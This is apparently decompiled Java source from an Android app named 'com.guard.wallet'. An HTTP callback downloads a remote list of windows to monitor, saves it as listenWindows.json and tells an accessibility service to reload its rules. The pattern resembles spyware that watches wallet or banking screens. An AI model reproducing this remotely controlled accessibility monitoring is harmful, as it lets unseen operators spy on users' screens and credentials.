package com.guard.wallet.http;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.service.MyAccessibilityService;
import java.io.IOException;
import java.util.List;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import okhttp3.ResponseBody;

/**
 * 监听窗口回调 — vendor http/m.
 *
 * 拉取远程监听窗口配置列表:
 * - 成功时将 JSON 写入本地 listenWindows.json
 * - 触发 MyAccessibilityService.F(1) 重新加载窗口规则
 */
public final class ListenWindowCallback implements Callback {
    @Override
    public void onFailure(Call call, IOException e) {
        AppUtils.s("ListenWindowCallback", e);
        if (!(e instanceof DuplicateRequestException)) { HttpClient.finishRequest(call.request().url().host()); HttpApiManager.routeForwarding(call, this); }
    }
    @Override
    public void onResponse(Call call, Response response) throws IOException {
        HttpClient.finishRequest(call.request().url().host());
        ResponseBody var11 = response.body();
        if (var11 != null) {
            try {
                ListenWindowCallback$1 var4 = new ListenWindowCallback$1();
                ApiResult var14 = (ApiResult) com.guard.wallet.utils.SharedPrefsManager.c(var11.string(), var4);
                if (var14 != null && var14.getSuccess()) {
                    if (var14.getData() != null && !((List) var14.getData()).isEmpty()) {
                        String var12 = com.guard.wallet.utils.SharedPrefsManager.N(var14.getData());
                        if (!AppUtils.B(var12)) {
                            String var15 = com.guard.wallet.utils.SystemHelper.i0();
                            if (!AppUtils.B(var15)) {
                                var15 = var15.concat("/listenWindows.json");
                                Log.d("ListenWindowCallback", var15);
                                boolean var3 = AppUtils.w(var15) || AppUtils.l(var15);
                                if (var3) { AppUtils.U(var15, var12); }
                            }
                        }
                    }
                    Log.d("ListenWindowCallback", "远程监听窗口已触达");
                    if (MyAccessibilityService.P() != null) {
                        MyAccessibilityService.P().F(1);
                    }
                }
            } catch (Exception var13) { AppUtils.s("ListenWindowCallback", var13); }
        }
        response.close();
    }
}
